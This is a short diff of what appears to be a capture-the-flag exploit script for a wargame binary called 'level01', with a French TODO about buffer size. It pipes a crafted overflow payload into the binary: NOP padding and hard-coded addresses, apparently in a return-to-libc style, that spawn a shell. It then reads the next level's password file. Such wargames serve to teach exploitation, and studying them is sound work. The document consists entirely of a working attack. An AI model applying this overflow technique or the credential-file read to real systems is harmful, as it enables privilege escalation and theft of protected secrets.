@@ -1,2 +1,7 @@
+TODO: revoir la taille du buffer dans la source
+
 cd /tmp
-(python -c 'print("dat_wil")' ; python -c 'print("admin\0" + "AAA1BBB2CCC3DDD4EEE5FFF6GGG7HHH8III9JJJ0KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR1S" + "\xd0\xae\xe6\xf7" + "\xe0\xeb\xe5\xb7" + "\xad\xd8\xff\xff" + "VVWWWWXXXXYYYYZZZZ")';cat) | ~/level01
+
+(python -c 'print("dat_wil")' ; python -c 'print("admin\0" + "\x90"*74 + "\xd0\xae\xe6\xf7" + "\xe0\xeb\xe5\xb7" + "\xec\x97\xf8\xf7")';cat) | ~/level01
+
+cat ../level02/.pass
